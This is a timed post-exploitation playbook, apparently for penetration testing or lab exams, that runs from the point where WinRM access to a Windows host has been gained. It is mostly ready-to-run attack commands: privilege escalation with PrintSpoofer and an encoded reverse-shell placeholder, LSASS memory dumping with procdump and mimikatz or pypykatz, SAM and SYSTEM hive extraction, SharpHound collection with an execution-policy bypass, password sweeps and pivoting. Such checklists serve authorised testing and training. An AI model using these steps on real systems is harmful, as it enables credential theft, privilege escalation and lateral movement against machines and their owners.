# Playbook: WinRM Access Obtained

## Minute 0: Connect + Classify

```
[ ] evil-winrm -i target -u user -p pass
[ ] whoami → user
[ ] whoami /priv → Privileges
[ ] whoami /groups → Group membership
[ ] hostname → Target name
[ ] systeminfo → OS/build
[ ] net localgroup administrators → Check admin status
```

## Minute 5: Immediate Privilege Escalation

```
[ ] whoami /priv → SeImpersonatePrivilege enabled?
    └── YES → Upload PrintSpoofer.exe
        upload PrintSpoofer.exe C:\Windows\Temp\
        ./PrintSpoofer.exe -i -c "powershell -enc <revshell>"
    └── NO → Proceed with manual checks

[ ] Check AlwaysInstallElevated:
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

[ ] Check unquoted service paths:
    wmic service get name,pathname | findstr /i /v "C:\Windows"

[ ] Check service permissions:
    sc query | findstr SERVICE_NAME
```

## Minute 15: Credential Access

```
[ ] If LOCAL ADMIN:
    upload procdump.exe
    ./procdump.exe -ma lsass.exe lsass.dmp
    download lsass.dmp
    └── pypykatz lsa minidump lsass.dmp
    └── OR: mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

[ ] Check stored creds:
    cmdkey /list

[ ] Check config files:
    dir C:\inetpub\ /s web.config
    dir C:\ProgramData\ /s *.config

[ ] Dump SAM:
    reg save HKLM\SAM sam.hive
    reg save HKLM\SYSTEM system.hive
    download sam.hive
    download system.hive
```

## Minute 30: Lateral Movement

```
[ ] Check network:
    netstat -ano | findstr TCP
    ipconfig /all
    arp -a
    route print

[ ] Upload SharpHound.ps1:
    upload SharpHound.ps1
    powershell -ep bypass
    . .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All

[ ] Password sweep (with found creds):
    └── Test same creds via WinRM to other hosts

[ ] Pivot setup if available:
    └── Check if chisel/ligolo available
    └── SSH tunnel if SSH port open
```

## Milestone Checks
- [ ] SeImpersonate? → PrintSpoofer → SYSTEM
- [ ] Domain user? → BloodHound
- [ ] LSASS dumped? → Extract domain creds
- [ ] Admin on WinRM? → Full host control + SAM dump
- [ ] No escalation? → Pivot + lateral to other hosts
